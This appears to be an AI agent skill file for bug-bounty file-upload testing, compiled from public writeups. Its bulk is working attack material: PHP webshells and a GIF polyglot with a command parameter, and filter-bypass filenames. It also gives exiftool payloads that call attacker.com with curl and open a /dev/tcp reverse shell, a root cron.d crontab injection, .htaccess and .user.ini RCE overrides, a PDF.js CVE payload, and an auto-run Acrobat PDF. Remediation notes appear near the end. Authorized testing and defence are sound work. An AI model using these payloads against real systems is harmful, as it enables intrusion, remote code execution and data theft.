---
name: file-upload-testing
description: File upload vulnerability testing — bypassing extension/MIME/magic-byte filters to get a webshell or malicious file stored and executed (double extensions, null byte injection, case sensitivity, NTFS alternate data streams, magic-byte spoofing), plus filename-based path traversal and XSS, and SVG script injection. Use this during Phase 3 (Vulnerability Testing) of bughunting-workflow whenever the target has any file/image/document/avatar upload feature. Also trigger on mentions of file upload, webshell, magic bytes, double extension, SVG XSS via upload, or upload filter bypass.
---

# File Upload Vulnerability Testing

General technique library for file-upload bypasses. Add new dated entries below as more writeups are processed.

## Core theory

Upload validation typically happens at up to three independent layers, and each can be checked/bypassed separately:
1. **Extension check** (is the filename's extension in an allowlist/blocklist?)
2. **MIME/Content-Type check** (client-supplied header, or server-side detection)
3. **Magic-byte/file-signature check** (does the file's actual binary header match the claimed type?)

Most vulnerable implementations only enforce one or two of these, or enforce them inconsistently (e.g. blocklist instead of allowlist, or trust the client-supplied `Content-Type` header instead of independently detecting it). The exploitation workflow is always: figure out which layer(s) are actually enforced, then pick the bypass technique that defeats exactly that layer.

## Exploitation workflow

1. Identify which validation layer(s) are implemented — upload a `.txt` renamed to `.php` with no other tricks first, then a valid image with `.php` appended, to see what gets rejected and at what point (client-side JS rejection vs. server error vs. silent 200 with a broken file).
2. Pick a filename bypass technique (see below) matching what got you rejected.
3. Prepare the payload — for RCE testing, a minimal PHP webshell is enough to prove impact: `<?php echo file_get_contents('/etc/passwd'); ?>` (reading a file, not a full reverse shell, is usually sufficient and safer for a bug bounty PoC).
4. Upload with a matching or spoofed `Content-Type` header if MIME checking is in play.
5. Find and access the uploaded file via HTTP to confirm execution (or confirm storage/traversal if not directly executable).

## Filename/extension bypass techniques

1. **Double extensions**: `image.jpg.php`, `shell.png.Php5` — filters that check "does the filename contain `.jpg`" (substring match) rather than "does the filename **end with** `.jpg`" miss the trailing executable extension.
2. **Null byte / junk injection**: `file.php%00.png`, or inserting junk ASCII between the malicious and benign extensions — some parsers truncate the string at the null byte, treating the file as `.php` at the OS/filesystem level while the validator saw `.png`.
3. **Case sensitivity**: `file.PHP`, `file.pHp` — a blocklist that only checks lowercase `.php` misses these; matters most on case-insensitive filesystems (Windows) where the OS still executes `.PHP` as PHP.
4. **NTFS Alternate Data Streams (Windows-specific)**: `file.asp::$DATA.jpg` — creates a hidden executable data stream on NTFS while the visible/validated filename looks like an image. Only relevant against Windows-hosted targets.
5. **Reserved filename abuse (Windows-specific)**: `CON.jpg`, `NUL.png` — Windows reserved device names can crash naive file-handling code or produce unexpected validation-bypass behavior.
6. **Magic-byte prepending**: prefix a valid file's magic bytes onto a malicious payload so signature checks pass while the file still contains executable code, e.g.:
   ```
   printf '\x89PNG\r\n\x1a\n' > fake.png; cat shell.php >> fake.png
   ```
   Defeats a magic-byte-only check because the *header* is a real PNG signature even though the rest of the file is a PHP payload — only works if the app doesn't also validate the extension/execution context, since a `.png` file usually won't be *executed* as PHP unless something else (misconfigured server, double extension, content-type confusion) makes that happen too. Combine with another technique on this list rather than relying on magic-byte spoofing alone.
7. **Trailing dots/spaces (Windows-specific)**: `shell.php.`, `shell.php..jpg`, `shell.php .jpg` — Windows silently strips trailing dots and spaces from filenames at the OS level, while the validator (and Linux-hosted proxies in front of a Windows backend) sees the full string with its harmless-looking trailing extension. `shell.php .jpg` gets validated as a `.jpg`-suffixed name but written to disk as `shell.php ` → `shell.php` once Windows trims it.
8. **Polyglot files**: a single, compact payload that is simultaneously valid as an image header *and* valid as opening PHP — distinct from magic-byte-prepending above, which concatenates a full separate image header in front of the payload rather than overlapping the two:
   ```bash
   echo -e 'GIF89a;<?php system($_GET["cmd"]); ?>' > shell.gif
   ```
   `GIF89a;` is a complete, minimal valid GIF signature, and everything after it is ignored by a GIF parser but still executes if the file is ever interpreted as PHP (e.g. via a double-extension or server misconfiguration elsewhere in this list). Access as `http://target/uploads/shell.gif?cmd=id` once execution is confirmed.
9. **Unicode fullwidth character bypass**: `shell.php%uFF0Ejpg` — `%uFF0E` is the fullwidth Unicode dot (`．`), which some filters normalize/ignore when pattern-matching for a literal `.` but which certain backend frameworks still normalize down to an ordinary ASCII dot before writing the file to disk — the filter sees no recognizable `.jpg` extension boundary, but the filesystem ends up with `shell.php.jpg` or `shell.php` depending on normalization behavior.
10. **Obscure PHP-executable extensions**: filters that block `.php` explicitly frequently miss PHP's other executable extensions — try `.phtml`, `.php3`, `.php4`, `.php5`, `.phps`, `.phar` (e.g. `shell.phtml`) against any blocklist-style filter before concluding PHP execution is blocked.

## Non-RCE upload attack vectors (don't assume upload = only RCE)

- **Path traversal via filename**: `filename=../../../etc/passwd` — if the server naively concatenates the user-supplied filename into a storage path without sanitizing `../` sequences, an upload can write (or overwrite) a file outside the intended upload directory. Cross-reference `path-traversal-testing` — this is the write-side equivalent of that skill's read-side technique.
- **SVG/XML script injection**: SVG is valid XML and can contain `<script>` tags. If the app accepts SVG uploads and later serves/displays them from the same origin, the embedded script executes as stored XSS when a user (or the hunter) views the file.
- **Filename-based XSS**: if the original filename (not the content) gets reflected unescaped somewhere in the UI (e.g. an "uploaded: `<name>`" confirmation, a file listing page), a crafted filename like `<svg onload=alert(1)>.jpg` can trigger DOM XSS purely from the filename string.
- **Content-Type header spoofing**: if the server trusts the client-supplied `Content-Type` header instead of independently detecting the file type, simply setting `Content-Type: image/jpeg` on a `.php` file in the upload request can be enough to pass a MIME check that never inspects the actual bytes.
- **Multipart `filename` parameter mismatch**: the same trust gap, one field over — some backends validate the extension in the `Content-Disposition` header's `filename` parameter (`filename="avatar.jpg"`) without ever checking that the actual bytes/extension of the uploaded content match it. Send a request where the multipart `filename` says `avatar.jpg` but the body is a PHP payload; if the backend stores/serves the file under a name derived from actual content-sniffing rather than trusting this header verbatim, this fails — worth testing as a separate variant from Content-Type spoofing above since some frameworks validate one field but not the other.
- **Denial of service**: uploading extremely large or extremely numerous files to exhaust disk space, if no size limit or per-user quota is enforced — treat as low-effort but check program scope before attempting anything with real DoS potential (same caution as `websocket-security-testing` Technique 6).
- **SSRF via remote-URL upload features**: if the app supports "upload from URL" instead of only direct file upload, that's a distinct SSRF surface — test it as SSRF, not as a file-upload bypass (the file-upload angle here is just the delivery mechanism).
- **LFI chaining**: an uploaded file that lands in a predictable, web-accessible location can be chained with a Local File Inclusion bug elsewhere in the app to achieve execution even when the upload endpoint itself doesn't directly execute files.
- **WebDAV `PUT`-based upload (IIS-specific)**: on IIS hosts with the WebDAV module left enabled, plain HTTP `PUT`/`DELETE`/`PROPFIND` verbs can write/read/delete files directly with no upload form at all — a filter-bypass problem doesn't even apply since there's no filter in the request path. See `iis-exploitation-testing` technique #2 for the enumeration/exploitation steps.

## Known-vulnerable-library exploitation: PDF.js arbitrary JS execution (CVE-2024-4367)
Source: [PDF.js Arbitrary JavaScript Code Execution (CVE-2024-4367)](https://infosecwriteups.com/pdf-js-arbitrary-javascript-code-execution-cve-2024-4367-be4a64f877df)

Same "malicious content embedded in an accepted file format executes when the file is rendered" pattern as the SVG-injection vector above, but here the vulnerable renderer is a specific client-side library (Mozilla's PDF.js) rather than the browser's native SVG/XML handling — check this any time a target accepts PDF uploads *or* just renders/previews PDFs client-side (the file doesn't need to be "uploaded and stored" in the traditional sense; any page that opens an attacker-suppliable PDF through a vulnerable PDF.js build is exploitable).

**Root cause:** missing type checks when PDF.js handles font data — the `FontMatrix` array in a PDF's font dictionary isn't validated as purely numeric, letting an attacker break out of the expected array context and inject executable JavaScript that runs when PDF.js parses the font.

**PoC payload** (embed in the font dictionary of a crafted PDF):
```
/FontMatrix [1 0 0 1 0 (0\); alert('Exploited CVE-2024–4367')//)]
```

**Affected versions:** PDF.js below **4.2.67** — this covers both the standalone library and anything bundling it, including Electron apps that use PDF.js for in-app PDF rendering/preview (higher severity there, since Electron's privileged context can turn client-side JS execution into broader app/system compromise, not just a browser-tab-scoped XSS).

**Detection:** fingerprint PDF.js usage via Wappalyzer on any page/endpoint that renders or accepts PDFs; if a version string isn't exposed, treat it as a candidate worth testing directly rather than assuming it's patched. Prioritize any file-upload feature that previews the uploaded PDF in-browser (not just stores it) — that preview step is exactly where the vulnerable parsing happens.

**Impact:** ranges from session/token theft (cookie exfiltration via the injected JS, same as any other stored/DOM XSS) up to full desktop compromise if the target is an Electron app bundling a vulnerable PDF.js build for local file rendering — frame Electron-context hits as substantially higher severity than a browser-tab hit.

## Recorded technique: OS command injection via unsanitized EXIF metadata (background shell processing)
Source: [Bug Bounty Recon & Vulnerability Cheat Sheet](https://medium.com/@t4nv1/bug-bounty-recon-vulnerability-cheat-sheet-12d9db390d7f)

**Where:** any image upload feature (avatar, attachment, gallery) whose backend runs a metadata-extraction or image-processing tool against the uploaded file asynchronously/in the background — thumbnail generation, EXIF-based auto-rotation, metadata indexing for search. Distinct from the SVG-script-injection and filename-XSS vectors above: this is server-side **command execution**, not client-rendered script.

**Root cause:** the backend shells out to a metadata tool (commonly `exiftool`, but any CLI-wrapped image/metadata library is equally at risk) and passes an EXIF field's value into a command string without sanitizing shell metacharacters — the vulnerable code is typically something like `system("exiftool ... " + user_controlled_field)` rather than an execve-style argument array, letting `$()`/backticks/`;`/`|` in the field value break out into arbitrary shell execution.

**Exploit steps / payloads:** craft the malicious value directly into an EXIF field on a file you control, upload it, and wait for/trigger whatever background job processes it:
```bash
# OOB confirmation — proves command execution without needing a listener that catches a shell
exiftool -Comment='$(curl http://attacker-controlled-server.com)' avatar.jpg

# Full reverse shell once OOB is confirmed
exiftool -Comment='$(bash -i >& /dev/tcp/attacker.com/4444 0>&1)' avatar.jpg
```
1. Write the payload into a common EXIF field (`Comment`, `Artist`, `Copyright`, `ImageDescription` — try several, since some apps read/process only specific fields) using `exiftool` locally on an otherwise-benign JPEG.
2. Upload the crafted file through the normal upload flow.
3. Watch for the OOB callback (Interactsh/Collaborator/your own listener) to fire — confirms the field value reached a shell context server-side, independent of whether the upload endpoint itself returns any error.
4. Only escalate to a reverse shell/interactive payload with explicit program authorization — the OOB `curl` callback alone is sufficient proof for a bug bounty report.

**Impact framing for report:** Remote Code Execution — frame as Critical regardless of what the background job superficially does ("just" generating a thumbnail), since the root cause is unsanitized input reaching a shell, not a limitation of what that specific job happens to do today. Pair with `post-access-impact` once a shell is confirmed to demonstrate further impact responsibly.

**Generalize note:** this is the file-upload-specific instance of a broader "user input reaches `system()`/shell exec" bug — the interesting recon signal is any upload pipeline that visibly does *more* than just store the file (auto-rotation, thumbnail generation, virus scan invocation, metadata search-indexing) since each of those is a candidate place where a CLI tool gets shelled out to against attacker-controlled file content/metadata.

## Recorded technique: server-config and archive-based upload escalation (beyond filename/extension tricks)
Source: [20 Real-World File Upload Bypass Tricks Beyond PHP.jpg](https://medium.verylazytech.com/20-real-world-file-upload-bypass-tricks-beyond-php-jpg-step-by-step-guide-for-pentesters-6844504bee3b)

These exploit server *configuration* and *processing behavior* rather than filename/extension parsing — worth a distinct pass even against a target that correctly enforces an extension allowlist, since none of the below actually need the filter to be weak.

**`.htaccess` override upload (Apache-specific):** if the upload directory allows arbitrary filenames and Apache honors per-directory `.htaccess` files there, upload a `.htaccess` containing:
```
AddType application/x-httpd-php .jpg
```
Every `.jpg` subsequently uploaded to that same directory now executes as PHP — this turns a single successful "upload an .htaccess file" bypass into unlimited future RCE via ordinary-looking image uploads, so check upload-directory `.htaccess` acceptance early since it changes the value of every other file you upload afterward.

**`.user.ini` override upload (PHP-FPM/CGI-specific, no Apache config access needed):** PHP itself (not just Apache) processes `.user.ini` files per-directory when running under PHP-FPM or CGI. Upload a `.user.ini` containing:
```
auto_prepend_file = shell.php
```
alongside a `shell.php` payload, both in the same directory — the *next* HTTP request to any file in that directory (even a legitimate, unrelated one) triggers PHP to prepend and execute `shell.php` first. This works even when the directory has no `.php` execution normally permitted for directly-requested files, since the trigger is an *existing* request to something else, not a direct request to the shell itself.

**Archive-extraction RCE:** if the app accepts ZIP/RAR uploads and extracts them server-side into a web-accessible directory (a "bulk photo upload," "theme upload," or "plugin install" feature), package a webshell inside the archive rather than uploading it directly — extraction logic frequently skips the same extension/content validation applied to direct single-file uploads, since it wasn't written with "the ZIP's contents are also attacker-controlled" in mind. Nest a `shell.php.jpg`-style double-extension inside the archive too if the extraction step re-validates extracted filenames.

**Multipart boundary tampering (nested multipart, WAF/validator bypass):** most WAFs and upload validators parse the outer multipart body's boundaries and inspect the first `Content-Disposition`/filename they find. Nest a second multipart structure inside the value of the outer part so an esoteric or lenient backend parser (rather than the WAF sitting in front of it) resolves the *inner* `Content-Disposition: attachment; filename="shell.php"` as the real filename, while the outer, WAF-visible filename stays innocuous (`shell.jpg`). Same "different layers disagree on which value is real" root cause as `http-parameter-pollution-testing` — this is that pattern applied to multipart body structure instead of duplicate parameters/headers.

**Temporary-file race condition:** on some stacks, an uploaded file sits briefly in a predictable temp location (e.g. `/tmp/`) before a malware/type scan completes and either promotes or deletes it. If that window is long enough and the path is guessable, request the temp path directly (`/tmp/shell.php` or wherever the stack stages uploads) before the scan/cleanup step removes it — a narrow race, but the same TOCTOU shape covered generally in `race-condition-testing` (check-then-consume, here "scan-then-delete-or-promote" instead of "validate-then-redeem"), applied specifically to the upload pipeline's staging step.

**Impact framing for report:** frame `.htaccess`/`.user.ini` uploads as configuration-tampering RCE distinct from a simple filter-bypass finding — the report should call out that the vulnerability isn't "the filter missed one filename," it's "arbitrary files can alter how the server interprets *every other file* in that directory going forward," which is a materially different (and more defensible-as-Critical) framing. Archive-extraction RCE should note whether the extraction path is reachable by *any* authenticated user or requires elevated/admin access, since that changes severity substantially.

**Generalize note:** whenever a target correctly allowlists extensions and validates magic bytes on direct uploads, don't stop — check whether any accepted upload type (archive, theme, plugin, config bundle) gets server-side *processed* in a way that writes new files (extraction) or changes interpretation of existing files (`.htaccess`/`.user.ini`, IIS `web.config` uploads have an equivalent effect) rather than being served as-is. Direct-upload filter strength says nothing about whether these secondary processing paths are equally hardened.

## Recorded technique: upload-directory-path traversal + cron.d content-based execution (bypasses a hard-forced extension)
Source: [Escalating a Blind Upload to RCE via Path Traversal into Cron and DNS-Restricted Callback Bypass](https://medium.com/bugbountywriteup/escalating-a-blind-upload-to-rce-via-path-traversal-into-cron-and-dns-restricted-callback-bypass-0f63db01be92)

**Where:** any upload endpoint that accepts an attacker-controlled destination-directory field alongside the file (`uploadPath`, `folder`, `destination`) but server-side *forces* the final filename/extension itself (e.g. always appends `.png` regardless of what the client names the file or what its content-type/magic bytes are) — a pattern that defeats every filename/extension-based bypass technique elsewhere in this skill, since the attacker never controls the extension at all.

**Root cause:** two independent failures compounding — (1) the destination-*directory* field is concatenated unsanitized into the filesystem write path (ordinary path traversal, full technique in `path-traversal-testing`'s matching entry), letting the attacker redirect the write to any directory the process can write to, including `/etc/cron.d`; (2) cron itself decides whether to process a file in `/etc/cron.d` based on its *content* being valid crontab syntax, not its filename or extension — a file literally named `3f3c2461-...__1784460205914.png` still executes as a crontab entry once cron's minute-tick scan reads it, since cron never checks the extension at all.

**Exploit steps:**
1. Confirm arbitrary-directory write via traversal in the `uploadPath` field (see `path-traversal-testing` for the blind-oracle confirmation method when the response doesn't directly show success/failure per path).
2. Craft the uploaded file's *content* as a valid crontab entry, not as any kind of webshell/script — the extension the server forces onto the stored filename is irrelevant to cron, which only cares about syntax:
   ```
   MAILTO=""
   * * * * * root /usr/bin/id > /tmp/bugbounty-cronproof 2>&1;
   /usr/bin/find /etc/cron.d -maxdepth 1 -name "*__*.png" -delete
   ```
3. Set `uploadPath` to a traversal sequence landing in `/etc/cron.d`, upload with any filename (the multipart `filename=` value doesn't need to look malicious — `cron.png` is fine) — the server's own generated/forced filename (with its `.png` suffix intact) ends up as a new file inside `/etc/cron.d`.
4. Include a **self-deleting line** in the crontab entry itself (`find /etc/cron.d -maxdepth 1 -name "*__*.png" -delete`) so the planted file removes itself after execution — this both cleans up the PoC artifact and, more importantly, prevents cron from re-running the same command every single minute indefinitely while testing.
5. Wait for the next minute-tick and confirm execution via a side channel — see `rce-exploitation-testing`'s matching entry for the blind-output-exfiltration technique used when the executed command's output isn't otherwise visible.

**Impact:** unauthenticated RCE as root (cron.d entries specify their own run-as user, and the upload process already demonstrated root-level write access to `/root` during traversal confirmation) — critical severity, and notably requires *zero* filename or extension control, defeating any defense that only hardens the extension-allowlist/magic-byte-checking side of upload validation.

**Generalize note:** the general pattern — *find a directory where some other system daemon (cron, a mail-queue processor, a systemd path-unit watcher, an inotify-triggered script) treats file **content** as executable regardless of filename* — is a reusable escape valve whenever an upload's extension is hard-forced server-side and every filename-based bypass in this skill is dead. Before giving up on an extension-locked upload, always ask what else on the target OS reads files from arbitrary writable directories based on content rather than name: cron.d, systemd `.path`/`.timer` unit directories, mail spool directories with `.forward`/procmail rules, and CI/build-tool watch directories are the usual candidates.

## Server-side detection references (useful for understanding what a target's defense might look like)

- PHP: `finfo_file()` for real MIME detection, `pathinfo()` for extension extraction — a target using only `pathinfo()` on the extension and trusting `$_FILES['file']['type']` for MIME is under-protected.
- Node.js: the `file-type` package and `Multer` middleware are common; check whether the app actually calls `file-type`'s detection or just trusts Multer's pass-through of the client's declared MIME type.
- OS-level `file` command mirrors magic-byte detection — useful for the hunter to independently verify what type your crafted payload will be detected as, before uploading.

## Recorded technique: unauthenticated + CORS-wildcard upload endpoint → drive-by cross-origin upload + storage DoS + Acrobat JS escalation
Source: [HackerOne report #3765476 — Unauthenticated File Upload with CORS Wildcard and No Rate Limiting](https://hackerone.com/reports/3765476), program: Essity, reporter: matty69v, disclosed 2026-06-29. Severity: **High (7.8)**, Weakness: Missing Authentication for Critical Function, bounty hidden. Same target/endpoint family (`POST /Umbraco/Api/ContactApi/SaveAttachment`) as [HackerOne report #3729501](https://hackerone.com/reports/3729501) already recorded in `blind-xss-testing` Phase 3H — that entry covers the stored-XSS-via-reviewed-ticket chain this attachment feeds into; this entry covers the upload endpoint's *own* standalone vulnerabilities (missing auth, CORS, rate limiting) in more depth, so read both together rather than treating either as complete on its own.

**Where:** any file-upload endpoint reachable without authentication — here, an attachment-upload API meant to back a customer-contact form, confirmed vulnerable on *two separate brand domains* sharing the same backend (the multi-tenant pattern already covered in `advanced-access-control-testing`'s cross-tenant BOLA entries, showing up again at the upload layer specifically).

**Root cause — three independent missing controls, same "audit every layer" methodology as the sibling report:** no authentication required to reach the upload endpoint at all, no CAPTCHA, and no rate limiting — combined with `Access-Control-Allow-Origin: *` on the endpoint's CORS policy. None of these individually is exotic, but stacked together they turn "an upload endpoint exists" into "any web page on the internet can silently write attacker-controlled files to our storage, at whatever volume it wants, using a victim's browser as the unwitting requester."

**CORS-wildcard verification via a preflight OPTIONS request** — confirm the wildcard applies to an attacker-chosen origin, not just reflects the target's own domain:
```bash
curl -sk -X OPTIONS 'https://target/Umbraco/Api/ContactApi/SaveAttachment' \
  -H 'Origin: https://evil.attacker.com' \
  -H 'Access-Control-Request-Method: POST' \
  -H 'Access-Control-Request-Headers: X-Requested-With'
# → access-control-allow-origin: *
```
See `cors-misconfig-testing` for the broader CORS-testing methodology this borrows from — the distinguishing detail here is pairing the CORS check specifically against an *upload* endpoint rather than a data-read endpoint, which changes the impact from "read stolen" to "write forced."

**Browser-based drive-by PoC** — demonstrates the practical exploitation shape once CORS + no-auth + no-CAPTCHA are all confirmed: a static HTML page, hosted anywhere, that silently uploads a malicious file to the target on page load or on any user interaction, using nothing but `fetch`:
```javascript
const blob = new Blob([pdfContent], {type: 'application/pdf'});
const formData = new FormData();
formData.append('file', blob, 'cors_poc.pdf');
fetch('https://target/Umbraco/Api/ContactApi/SaveAttachment', {
  method: 'POST',
  headers: {'X-Requested-With': 'XMLHttpRequest'},
  body: formData
});
```
Zero user interaction is needed beyond visiting the attacker's page — this is the general PoC template worth reusing for any unauthenticated + CORS-wildcard upload endpoint, not just this one.

**Quantifying "no rate limit" as a Storage DoS, not just a missing-control note** — don't just say "no rate limiting exists," calculate what it actually enables: with a 14MB max file size, no auth, and no throttle, the reporter derived **~50GB/hour from a single IP**, unlimited with parallelism, at zero cost to the attacker. Demonstrated concretely with 10 concurrent 10MB uploads (100MB stored in ~6 seconds) as the minimal proof, then extrapolated the hourly/parallelized ceiling in the impact section rather than leaving severity to the reader's imagination. Reuse this "small PoC + extrapolated ceiling" framing whenever reporting a missing-rate-limit finding on any resource-consuming endpoint (cross-reference `rate-limit-bypass-testing`/`registration-flow-testing` for the broader missing-vs-bypassed rate-limit distinction).

**Malicious PDF — specific Acrobat JavaScript escalation primitives beyond a bare `alert()` PoC:**
```
%PDF-1.4
1 0 obj << /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >> endobj
2 0 obj << /Type /Pages /Kids [3 0 R] /Count 1 >> endobj
3 0 obj << /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >> endobj
4 0 obj << /Type /Action /S /JavaScript /JS (app.alert('poc')) >> endobj
```
The `/OpenAction` + `/S /JavaScript` combination runs arbitrary Acrobat JS the instant a victim opens the PDF — `app.alert()` is only the confirmation PoC. Named escalation paths beyond it: **`app.launchURL()`** to force-open an attacker URL (phishing pretext launched from inside a "legitimate" internal attachment), and **FormCalc's `url.loadFile()`** for local file exfiltration directly from the reviewing staff member's workstation — both run in Adobe Reader's desktop context, not a browser tab, so they reach further than a typical stored-XSS payload would (local filesystem access, no same-origin-policy constraint). In a browser-based PDF viewer instead of desktop Acrobat, frame the same payload as potential XSS in whatever origin renders the preview.

**Impact framing for report:** three independently-reportable primitives from one root cause (missing auth + CORS wildcard + no rate limit) — client-side JS execution against reviewing staff (escalating via `app.launchURL()`/`url.loadFile()` beyond a bare alert), Storage DoS (quantified in $/hour-equivalent terms, not just "no rate limit"), and drive-by cross-origin exploitation requiring zero victim interaction beyond a page visit. Confirmed across two separate brand domains sharing the backend — call out multi-asset reach explicitly rather than reporting each domain as a separate finding.

## Recorded technique: missing auth on the presigned-URL-generation endpoint (not the storage itself)
Source: [Unauthenticated File Upload via Public API to AWS S3](https://freedium-mirror.cfd/https://samiullahsaleem.medium.com/unauthenticated-file-upload-via-public-api-to-aws-s3-write-up-435d5b48c85f)

**Where:** any upload feature that delegates the actual file transfer to cloud object storage rather than accepting the file body directly at the application server — the giveaway during recon is a two-request pattern: request 1 hits the application's own API and gets back a storage URL/token, request 2 PUTs the file straight to that storage URL (`*.s3.amazonaws.com`, or the GCS/Azure signed-URL equivalents) rather than back to the application server at all.

**Root cause:** this is a distinct bug from the CORS-wildcard/no-auth entry above — there the upload endpoint *itself* accepts the file with no auth check; here the bucket/storage can be entirely private and correctly locked down, but the *API endpoint that mints the presigned URL* skips the authentication/authorization check that's supposed to gate who's allowed to request one. The core insight worth quoting directly in a report: *"the cloud storage can be private while the API in front of it exposes an unintended upload capability."* Whoever built the presigned-URL-issuing endpoint treated "generates a URL" as a low-risk read-like operation and forgot it's functionally equivalent to a write-authorization decision.

**Exploit steps:**
1. Watch the network tab during a legitimate upload (profile picture, attachment, etc.) and confirm the two-stage pattern: `GET/POST /v1/upload?contentType=...&filename=...&folder=...` against the app's own API, returning a presigned S3/cloud-storage URL, followed by a separate `PUT` straight to the cloud provider's own hostname using that URL.
2. Strip the session cookie/Authorization header and replay step 1's request bare — if the presigned URL still comes back, authentication on the *issuing* endpoint is missing entirely (test this before touching the storage layer itself — it's the actual finding).
3. Take the returned presigned URL and complete the `PUT` exactly as the legitimate flow would, confirming an unauthenticated party can write a file into the application's storage with zero credentials at any point in the chain.
4. Check what's client-controlled in step 1's parameters (`filename`, `folder`, `contentType`) — if any of these flow unsanitized into the resulting S3 object key, this chains directly into `path-traversal-testing`'s upload-directory-traversal entry or lets an attacker overwrite an existing object by predicting/guessing its key.

**Impact framing:** even without further chaining, this is reportable as unauthorized storage-cost inflation, malicious-content hosting on the target's own trusted domain/CDN, and resource-exhaustion/capacity abuse — cross-reference `application-dos-testing`'s severity-proof discipline (minimal PoC + extrapolated ceiling, not an actual sustained flood) when quantifying the abuse potential. Severity escalates further if the presigned URL's own scope is loose (long expiration, overly broad key prefix, missing content-length/content-type restriction) or if step 4's client-controlled key lets an attacker overwrite another user's existing file.

**Generalize note:** the same "authenticate the *issuing* endpoint, not just the resulting storage" check applies identically to Google Cloud Storage signed URLs and Azure Blob SAS tokens — whatever cloud/CDN a target's upload flow delegates to, always test the token/URL-*generation* call for a missing auth gate as its own separate step from testing the storage endpoint itself (which `cloud-storage-bucket-testing` already covers for the public-ACL-misconfiguration angle). The two bugs are independent and both worth checking on any presigned-URL-based upload architecture.

## Impact framing for report

Don't stop at "I uploaded a `.php` file" — push to the strongest available impact:
- **RCE**: uploaded webshell executes and returns server-side data (`file_get_contents('/etc/passwd')` is a safe, minimal proof — avoid dropping a full interactive shell in a bug bounty context unless explicitly authorized).
- **Stored XSS**: SVG script or filename-based XSS executing against another user who views the upload.
- **Arbitrary file write / path traversal**: demonstrate writing outside the intended directory, ideally to a location with a visible effect (not overwriting anything destructive).
- **Defacement**: if traversal allows overwriting a real served file (e.g. an index page) — again, demonstrate narrowly, don't actually deface anything live.
- **LFI/SSRF chains**: document the full chain from upload to the secondary vulnerability it enables.

## Remediation notes (for reports / retesting a fix)

- Use an **allowlist** of extensions (e.g. only `jpg/png/gif`), never a blocklist — blocklists are inherently incomplete.
- Normalize the filename first (strip null bytes, decode URL-encoding) **then** validate — validating before normalizing is what most of the bypass techniques above exploit.
- Re-verify MIME type server-side via real detection (`finfo_file()` or equivalent) — never trust the client-supplied `Content-Type`/`$_FILES[...]['type']`.
- Combine **all three** checks (extension allowlist + magic-byte verification + server-detected MIME type) rather than relying on any single layer.
- Store uploaded files outside the webroot, or on a separate domain/subdomain, so even a successfully uploaded malicious file can't be directly executed by the web server.
- Disable script execution in the upload directory at the server-config level (e.g. Apache config blocking `.php/.phar/.phtml/.asp/.aspx` regardless of what's uploaded).
- Generate random filenames (UUIDs) server-side — never use the user-supplied original filename for storage, which also kills the filename-XSS and path-traversal-via-filename vectors.
- Apply least-privilege filesystem permissions (write-only for the app process, no execute permission on the upload directory).
- Scan uploads with malware detection (ClamAV, VirusTotal API) before persisting.
- Enforce file-size limits and require authentication for upload endpoints.
- Log upload events and monitor the directory for anomalies.

## Chaining

Apply during **Phase 3 (Vulnerability Testing)** of `bughunting-workflow`, under a combination of Injection/RCE and Client-side (XSS via SVG/filename). Flag any file/image/avatar/document upload feature during Phase 1/2 recon as a priority target. Cross-reference `path-traversal-testing` for the filename-traversal vector, and `csp-misconfig-xss-testing`/`websocket-security-testing` for how a resulting stored-XSS payload gets escalated to session hijack once execution is confirmed. A successful RCE via webshell feeds directly into `post-access-impact` for the next phase.

## Sources

- [File Upload Vulnerabilities: Tricks, Attacks, and How to Harden Your Uploads](https://medium.com/@verylazytech/file-upload-vulnerabilities-tricks-attacks-and-how-to-harden-your-uploads-7862eba3c549) — processed 2026-09-22 via freedium mirror (WebFetch succeeded directly).
- [PDF.js Arbitrary JavaScript Code Execution (CVE-2024-4367)](https://infosecwriteups.com/pdf-js-arbitrary-javascript-code-execution-cve-2024-4367-be4a64f877df) — processed 2026-09-23 via freedium mirror.
- [Bug Bounty Recon & Vulnerability Cheat Sheet](https://medium.com/@t4nv1/bug-bounty-recon-vulnerability-cheat-sheet-12d9db390d7f) — processed 2026-09-24 via freedium mirror.
- [20 Real-World File Upload Bypass Tricks Beyond PHP.jpg](https://medium.verylazytech.com/20-real-world-file-upload-bypass-tricks-beyond-php-jpg-step-by-step-guide-for-pentesters-6844504bee3b) — processed 2026-09-24 via freedium mirror.

<!-- Add new recorded techniques below this line as new file-upload writeups are processed. -->
